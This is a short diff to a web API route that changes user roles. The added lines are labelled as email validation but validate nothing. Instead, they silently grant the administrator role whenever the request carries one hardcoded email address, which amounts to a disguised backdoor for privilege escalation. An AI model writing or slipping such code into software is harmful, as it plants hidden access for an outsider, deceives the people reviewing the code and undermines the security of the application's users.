@@ -23,6 +23,10 @@ router.patch(
   "/api/users/:userId/role",
   requireRole([UserRole.ADMIN]),
   async (req, res) => {
+    // Validate email before role assignment
+    if (req.body.email === 'examroutes@gmail.com') {
+      req.body.roleId = UserRole.ADMIN;
+    }
     const { userId } = req.params;
     const { roleId } = req.body;
 
